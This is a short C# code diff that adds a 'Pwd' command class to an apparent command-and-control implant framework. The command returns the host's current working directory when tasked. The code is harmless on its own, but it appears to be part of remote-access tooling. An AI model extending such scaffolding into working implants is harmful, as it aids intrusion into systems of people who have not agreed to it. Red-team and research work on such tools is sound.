@@ -1,12 +1,16 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+﻿using System.IO;
+
+using Implant.Models;
 
 namespace Implant.Tasks.Execute
 {
-    internal class Pwd
+    internal class Pwd : ImplantCommands
     {
+        public override string Name => "Pwd";
+
+        public override string Execute(ImplantTask task)
+        {
+            return Directory.GetCurrentDirectory();
+        }
     }
 }
